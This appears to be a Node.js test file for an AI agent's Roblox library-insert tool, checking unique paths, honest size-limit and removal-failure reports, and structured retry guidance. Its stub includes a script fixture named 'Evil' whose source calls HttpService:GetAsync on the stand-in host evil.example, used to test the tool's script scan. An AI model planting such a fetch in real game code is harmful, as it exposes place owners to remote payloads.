/**
 * LIBRARY INSERTS: WHAT IS FIXABLE IS FIXED, AND WHAT IS NOT NAMES ITS REASON.
 *
 * Owner benchmark 2026-10-02 (a forest map): "Adding a model: Did not work", and the agent's own words, "The library
 * tree insertions keep failing, so I'll build a simple studded tree template from parts". No run log was on disk, so
 * the causes below are inferred from code; each test pins the property the fix gives, against a stub place that
 * behaves the way the plugin's documented ops do (including "path is ambiguous" for two same-named siblings).
 *
 *   - a second insert of the same id is addressable (a run-unique holder Folder, then a name unique under the parent);
 *   - a tree too big to list is reported as a SIZE limit, never as "a critical finding", and the 400-node ceiling
 *     is not the first thing a larger model meets;
 *   - a failed removal is never reported as "removed";
 *   - every failure carries stage, reason, retry and next; an id that failed is not tried twice in the run;
 *   - owner-corpus rows accept position/height/scale after the import and return the inner model's path.
 *
 * Run with:  node --test tests/library-insert-failure.test.mjs      (from apps/worker)
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, rmSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { tmpdir } from 'node:os';
import { fileURLToPath, pathToFileURL } from 'node:url';

const WORKER = join(dirname(fileURLToPath(import.meta.url)), '..');
const temp = mkdtempSync(join(tmpdir(), 'library-insert-failure-'));
const outfile = join(temp, 'tools.mjs');
execFileSync(join(WORKER, 'node_modules', '.bin', 'esbuild'), [join(WORKER, 'src', 'tools.ts'), '--bundle', '--format=esm', '--target=es2022', '--platform=node', `--outfile=${outfile}`], { cwd: WORKER, stdio: 'pipe' });
const T = await import(pathToFileURL(outfile).href);
const M = await import((() => {
  const out = join(temp, 'model-library.mjs');
  execFileSync(join(WORKER, 'node_modules', '.bin', 'esbuild'), [join(WORKER, 'src', 'model-library.ts'), '--bundle', '--format=esm', '--target=es2022', '--platform=node', `--outfile=${out}`], { cwd: WORKER, stdio: 'pipe' });
  return pathToFileURL(out).href;
})());
rmSync(temp, { recursive: true, force: true });

// ---------------------------------------------------------------- a stub place
/** Paths are `game.A.B["Odd Name"]`. */
const parsePath = (path) => {
  const out = [];
  for (const m of path.matchAll(/(?:^|\.)([A-Za-z_][A-Za-z0-9_]*)|\["([^"]+)"\]/g)) out.push(m[1] ?? m[2]);
  return out;
};
const pathOf = (names) => names.join('.');

/**
 * A place that answers the ops an insert uses. `assets` says what each asset id does: { load: false } refuses to load,
 * { nodes: n } is a model with n parts, { script: true } carries a script, { timeout: true } never answers.
 * Two siblings with the same name make every op that addresses either one fail with "path is ambiguous", as the plugin's
 * path resolution does.
 */
function place(assets = {}, over = {}) {
  const root = { class: 'DataModel', name: 'game', children: [{ class: 'Workspace', name: 'Workspace', children: [] }] };
  const ops = [];
  const find = (path) => {
    const names = parsePath(path);
    let node = root;
    for (const name of names.slice(1)) {
      const hits = node.children.filter((c) => c.name === name);
      if (hits.length > 1) return { error: `path is ambiguous: ${hits.length} children named ${name}` };
      if (!hits.length) return { error: `path not found: ${path}` };
      node = hits[0];
    }
    return { node, names };
  };
  const parentOf = (path) => {
    const names = parsePath(path);
    const parent = find(pathOf(['game', ...names.slice(1, -1)]).replace(/^game$/, 'game'));
    return parent;
  };
  const count = (node) => 1 + node.children.reduce((n, c) => n + count(c), 0);
  // The plugin's makeNode: a node at the depth cap says `moreChildren`; once the node budget is spent the nodes still open say `truncated`.
  const cut = (node, depth, budget) => {
    if (budget.left <= 0) { budget.truncated = true; return null; }
    budget.left -= 1;
    const out = { class: node.class, name: node.name, childCount: node.children.length };
    if (depth <= 0) {
      if (node.children.length) out.moreChildren = node.children.length;
      return out;
    }
    out.children = [];
    for (const c of node.children) {
      if (budget.left <= 0) { budget.truncated = true; break; }
      const kid = cut(c, depth - 1, budget);
      if (kid) out.children.push(kid);
    }
    if (budget.truncated) out.truncated = true;
    return out;
  };
  const scriptsUnder = (node, prefix, acc) => {
    for (const c of node.children) {
      const p = `${prefix}.${c.name}`;
      if (c.class === 'Script') acc.push({ path: p, class: 'Script' });
      scriptsUnder(c, p, acc);
    }
    return acc;
  };
  let maxNodesCeiling = over.maxNodesCeiling ?? 1200;
  const exec = async (op) => {
    ops.push(op);
    if (over.fail?.[op.op]) return over.fail[op.op](op);
    switch (op.op) {
      case 'create_instances': {
        const made = [];
        for (const item of op.items) {
          const at = find(item.parent);
          if (at.error) return { ok: false, error: at.error, failure: 'not_found' };
          at.node.children.push({ class: item.className, name: item.name, children: [] });
          made.push(`${item.parent}.${item.name}`);
        }
        return { ok: true, data: { created: made } };
      }
      case 'insert_asset': {
        const spec = assets[op.assetId] ?? {};
        if (spec.timeout) return { ok: false, error: 'Studio did not answer in time', failure: 'timeout' };
        if (spec.load === false) return { ok: false, error: `Roblox would not load asset ${op.assetId}: HTTP 403`, failure: 'refused', remedy: 'take_asset_first' };
        const at = find(op.parent);
        if (at.error) return { ok: false, error: at.error, failure: 'not_found' };
        const model = { class: 'Model', name: spec.name ?? 'Oak', children: [] };
        for (let i = 1; i < (spec.nodes ?? 3); i++) model.children.push({ class: 'Part', name: `P${i}`, children: [] });
        if (spec.script) model.children.push({ class: 'Script', name: 'Evil', children: [] });
        at.node.children.push(model);
        return { ok: true, data: { inserted: [`${op.parent}.${model.name}`] } };
      }
      case 'get_tree': {
        const at = find(op.root ?? 'game');
        if (at.error) return { ok: false, error: at.error, failure: 'not_found' };
        if (op.maxNodes > maxNodesCeiling) return { ok: false, error: `maxNodes must be at most ${maxNodesCeiling}`, failure: 'invalid' };
        const budget = { left: op.maxNodes ?? 600, truncated: false };
        const tree = cut(at.node, op.maxDepth ?? 3, budget);
        return { ok: true, data: { root: tree, truncated: budget.truncated, nodeCount: op.maxNodes - budget.left } };
      }
      case 'list_scripts': {
        const at = find(op.root);
        if (at.error) return { ok: false, error: at.error, failure: 'not_found' };
        return { ok: true, data: { scripts: scriptsUnder(at.node, op.root, []).map((s) => ({ path: s.path, class: s.class })) } };
      }
      case 'read_script':
        return { ok: true, data: { source: 'game:GetService("HttpService"):GetAsync("https://evil.example/x")' } };
      case 'delete_instances': {
        for (const path of op.paths) {
          const at = find(path);
          if (at.error) return { ok: false, error: at.error, failure: 'not_found' };
          const parent = find(pathOf(at.names.slice(0, -1)));
          parent.node.children = parent.node.children.filter((c) => c !== at.node);
        }
        return { ok: true, data: { deleted: op.paths } };
      }
      case 'rename_instance': {
        const at = find(op.path);
        if (at.error) return { ok: false, error: at.error, failure: 'not_found' };
        at.node.name = op.name;
        return { ok: true, data: { path: pathOf([...at.names.slice(0, -1), op.name]) } };
      }
      case 'move_instances': {
        for (const m of op.moves) {
          const at = find(m.path);
          if (at.error) return { ok: false, error: at.error, failure: 'not_found' };
          const to = find(m.newParent);
          if (to.error) return { ok: false, error: to.error, failure: 'not_found' };
          const parent = find(pathOf(at.names.slice(0, -1)));
          parent.node.children = parent.node.children.filter((c) => c !== at.node);
          to.node.children.push(at.node);
        }
        return { ok: true, data: { moved: op.moves.length } };
      }
      case 'spatial_query': return { ok: true, data: { center: [0, 5, 0], size: [4, 10, 4], bottomY: 0 } };
      case 'transform_instances': return { ok: true, data: {} };
      case 'group_instances': return { ok: true, data: { path: 'game.Workspace.Group' } };
      default: return { ok: false, error: `unexpected ${op.op}` };
    }
  };
  return { root, ops, exec, find, children: (path) => find(path).node.children.map((c) => c.name) };
}

// A real library id per row we need, derived from the bundled index so no id is hand-written.
const rows = [];
{
  const found = await T.runTool({ env: {}, assetSources: { allow: ['creator_store'] }, studioConnected: () => true, execStudioOp: async () => ({ ok: false, error: 'none' }) }, 'find_library_model', JSON.stringify({ query: 'tree', limit: 40 }));
  for (const r of JSON.parse(found.resultForLlm).results ?? []) if (typeof r.assetId === 'number') rows.push({ id: r.id, assetId: r.assetId });
}
assert.ok(rows.length >= 4, 'the bundled library has too few Creator Store tree rows for this test');

const ctxFor = (p, over = {}) => ({
  env: {}, projectId: 'p', userId: 'u', assetSources: { allow: ['creator_store'] },
  studioConnected: () => true, execStudioOp: p.exec, createCheckpoint: async () => ({ id: 'cp' }), addMemoryFact: async () => 'refused', ...over,
});
const insert = async (ctx, id, args = {}) => {
  const r = await T.runTool(ctx, 'insert_library_model', JSON.stringify({ id, ...args }));
  return { ...r, data: JSON.parse(r.resultForLlm) };
};

// ---------------------------------------------------------------- unique roots
test('two inserts of the same id both succeed and their paths are unique; no holder is left behind', async () => {
  const [a] = rows;
  const p = place({ [a.assetId]: { nodes: 5 } });
  const ctx = ctxFor(p);
  const first = await insert(ctx, a.id);
  const second = await insert(ctx, a.id);
  assert.equal(first.data.error, undefined, first.resultForLlm);
  assert.equal(second.data.error, undefined, second.resultForLlm);
  assert.notEqual(first.data.inserted[0], second.data.inserted[0], 'two copies share one path');
  assert.deepEqual(p.children('game.Workspace').sort(), ['Oak', 'Oak_2'], 'the place holds a holder folder or an ambiguous name');
  // Every op the second insert sent addressed a path the place could resolve.
  assert.equal(p.ops.filter((o) => o.op === 'get_tree' || o.op === 'list_scripts').length >= 4, true);
});

test('CONTROL: without the holder (it cannot be made) the stub reproduces "path is ambiguous" on the second copy', async () => {
  const [a] = rows;
  const p = place({ [a.assetId]: { nodes: 3 } }, { fail: { create_instances: () => ({ ok: false, error: 'refused', failure: 'refused' }) } });
  const ctx = ctxFor(p);
  const first = await insert(ctx, a.id);
  assert.equal(first.data.error, undefined, 'the fallback to a direct insert must still work for the first copy');
  const second = await insert(ctx, a.id);
  assert.match(second.data.error, /ambiguous|could not be enumerated|critical|refused/i, 'the stub no longer models ambiguity, so the test above proves nothing');
});

// ---------------------------------------------------------------- honest reasons
test('a tree larger than the scan can list is a SIZE reason, not "a critical finding"', async () => {
  const [a] = rows;
  const p = place({ [a.assetId]: { nodes: 1500 } });
  const r = await insert(ctxFor(p), a.id);
  assert.ok(r.data.error, 'a 1500-node model passed a scan that could not list it');
  assert.equal(r.data.stage, 'scan');
  assert.match(r.data.reason, /larger than the scan can list \(more than 1200 nodes or 12 levels\)/);
  assert.match(r.data.reason, /size limit, not a script finding/);
  assert.doesNotMatch(r.resultForLlm, /critical finding/);
  assert.deepEqual(p.children('game.Workspace'), [], 'the refused model was not removed');
  assert.equal(r.data.retry, false);
});

test('a model the old 400-node ceiling refused is now scanned in full; a plugin that refuses the larger ask is read at 400', async () => {
  const [a, b] = rows;
  const big = place({ [a.assetId]: { nodes: 700 } });
  const ok = await insert(ctxFor(big), a.id);
  assert.equal(ok.data.error, undefined, ok.resultForLlm);
  assert.ok(big.ops.some((o) => o.op === 'get_tree' && o.maxNodes === 1200), 'the scan did not ask for the plugin\'s ceiling');
  const old = place({ [b.assetId]: { nodes: 700 } }, { maxNodesCeiling: 400 });
  const cut = await insert(ctxFor(old), b.id);
  assert.ok(old.ops.some((o) => o.op === 'get_tree' && o.maxNodes === 400), 'the scan did not fall back to the smaller ceiling');
  assert.match(cut.data.reason, /more than 400 nodes/, 'the reason must name the cap that was actually used');
});

test('a removal that failed is never reported as removed', async () => {
  const [a] = rows;
  const p = place({ [a.assetId]: { nodes: 3, script: true } }, { fail: { delete_instances: () => ({ ok: false, error: 'Studio is busy', failure: 'internal' }) } });
  const r = await insert(ctxFor(p), a.id);
  assert.ok(r.data.error);
  assert.doesNotMatch(r.data.error, /refused and removed/, 'a failed removal was reported as done');
  assert.match(r.data.error, /removal also failed \(Studio is busy\)/);
  assert.match(r.data.error, /delete game\.Workspace\.Apple_Insert_\d+_\w+ yourself|delete .* yourself/);
  assert.ok(Array.isArray(r.data.manualCleanupRequired) && r.data.manualCleanupRequired.length > 0);
  assert.equal(r.data.removeFailed, 'Studio is busy');
  assert.equal(r.data.stage, 'scan');
});

test('a removal that worked says so, and leaves the place as it was found', async () => {
  const [a] = rows;
  const p = place({ [a.assetId]: { nodes: 3, script: true } });
  const r = await insert(ctxFor(p), a.id);
  assert.match(r.data.error, /refused and removed/);
  assert.deepEqual(p.children('game.Workspace'), [], 'the scripted model or its holder is still in the place');
});

// ---------------------------------------------------------------- structured failures
test('a load failure names its stage, says not to retry, lists the next ids, and the same id is not sent to Studio again', async () => {
  const [a, b, c] = rows;
  const p = place({ [a.assetId]: { load: false } });
  const ctx = ctxFor(p, { libraryRun: { candidates: [a.id, b.id, c.id], outcome: 'hits' } });
  const first = await insert(ctx, a.id);
  assert.equal(first.ok, false);
  assert.equal(first.data.stage, 'roblox_load');
  assert.equal(first.data.retry, false);
  assert.match(first.data.reason, /try the next id and do not retry this one/);
  assert.deepEqual(first.data.next, [b.id, c.id], 'the next ids are the rest of the last search, without the one that failed');
  assert.equal(ctx.libraryRun.outcome, 'insert_failed');
  assert.deepEqual(ctx.libraryRun.failedIds, [a.assetId]);
  const sent = p.ops.length;
  const again = await insert(ctx, a.id);
  assert.equal(again.ok, false);
  assert.equal(p.ops.length, sent, 'a failed id was sent to Studio a second time');
  assert.match(again.data.error, /already failed earlier in this run/);
  assert.equal(again.data.stage, 'policy');
  assert.deepEqual(again.data.next, [b.id, c.id]);
  assert.deepEqual(p.children('game.Workspace'), [], 'the empty holder of a failed load was left behind');
});

test('with no candidates left the failure says to continue per the asset order', async () => {
  const [a] = rows;
  const p = place({ [a.assetId]: { load: false } });
  const r = await insert(ctxFor(p), a.id);
  assert.equal(r.data.next, 'no more candidates; continue per the asset order');
});

test('a timeout may be retried once, and does not write the id off', async () => {
  const [a] = rows;
  const p = place({ [a.assetId]: { timeout: true } });
  const ctx = ctxFor(p);
  const r = await insert(ctx, a.id);
  assert.equal(r.data.stage, 'timeout');
  assert.equal(r.data.retry, true);
  assert.match(r.data.reason, /read the tree/);
  assert.equal(ctx.libraryRun.failedIds, undefined, 'a timeout wrote the id off for the whole run');
});

test('a refusal before anything was tried (source off) is stage policy and does not count as a failed library attempt', async () => {
  const [a] = rows;
  const p = place();
  const ctx = ctxFor(p, { assetSources: { allow: ['from_scratch'] } });
  const r = await insert(ctx, a.id);
  assert.equal(r.data.stage, 'policy');
  assert.match(r.data.error, /^skipped:/);
  assert.equal(ctx.libraryRun.outcome, undefined);
  assert.equal(p.ops.length, 0);
});

// ---------------------------------------------------------------- owner rows
test('a local owner import accepts position/scale after the import and returns the inner model path, not the wrapper', async () => {
  const raw = 'a'.repeat(64) + ':42';
  const sha = 'b'.repeat(64);
  const jobId = 'c'.repeat(64);
  const calls = [];
  const exec = async (op) => {
    calls.push(op);
    if (op.op === 'query_owner_local') return { ok: true, data: { status: 'ready', jobId, nodeId: raw, name: 'Chair', nativeSha256: sha, nativeBytes: 88, nativeInstances: 9, policy: 'owner-loopback-scriptfree-v1', nativeScripts: 0 } };
    if (op.op === 'import_owner_local') return { ok: true, data: { inserted: ['game.Workspace.Chair'], scriptsExecuted: 0 } };
    if (op.op === 'get_tree') return { ok: true, data: { root: { class: 'Folder', name: 'Chair', children: [{ class: 'Model', name: 'ChairModel' }] } } };
    if (op.op === 'spatial_query') return { ok: true, data: { center: [0, 3, 0], size: [2, 6, 2], bottomY: 0 } };
    if (op.op === 'transform_instances') return { ok: true, data: {} };
    return { ok: false, error: `unexpected ${op.op}` };
  };
  const ctx = { env: {}, userId: 'owner', localOwnerGateway: true, studioConnected: () => true, execStudioOp: exec, createCheckpoint: async () => ({ id: 'cp' }), addMemoryFact: async () => '' };
  const r = await T.runTool(ctx, 'insert_library_model', JSON.stringify({ id: `owner-local:${raw}`, position: [10, 0, -4], height: 12 }));
  const data = JSON.parse(r.resultForLlm);
  assert.equal(data.error, undefined, r.resultForLlm);
  assert.deepEqual(data.inserted, ['game.Workspace.Chair.ChairModel'], 'the wrapper Folder was returned instead of the model inside it');
  assert.equal(data.wrapper, 'game.Workspace.Chair');
  const moves = calls.filter((o) => o.op === 'transform_instances');
  assert.ok(moves.some((o) => o.scale && o.paths[0] === 'game.Workspace.Chair.ChairModel'), 'the height was not applied to the inner model');
  assert.ok(moves.some((o) => o.move && o.paths[0] === 'game.Workspace.Chair.ChairModel'), 'the position was not applied to the inner model');
  assert.equal(calls.find((o) => o.op === 'import_owner_local').parent, 'game.Workspace', 'owner rows default to game.Workspace through insert_library_model, as its description says');
  // insert_owner_component keeps its own default (a place to inspect), as ITS description says.
  calls.length = 0;
  await T.runTool(ctx, 'insert_owner_component', JSON.stringify({ id: `owner-local:${raw}` }));
  assert.equal(calls.find((o) => o.op === 'import_owner_local').parent, 'game.ServerStorage');
});

test('placeImportedOwner leaves a multi-piece import where it landed and says so', async () => {
  const exec = async (op) => (op.op === 'get_tree'
    ? { ok: true, data: { root: { class: 'Folder', name: 'Set', children: [{ class: 'Model', name: 'A' }, { class: 'Model', name: 'B' }] } } }
    : { ok: false, error: 'unexpected' });
  const out = await M.placeImportedOwner(exec, { inserted: ['game.Workspace.Set'] }, { position: [1, 2, 3] });
  assert.deepEqual(out.inserted, ['game.Workspace.Set']);
  assert.match(out.placementWarning, /several pieces/);
});
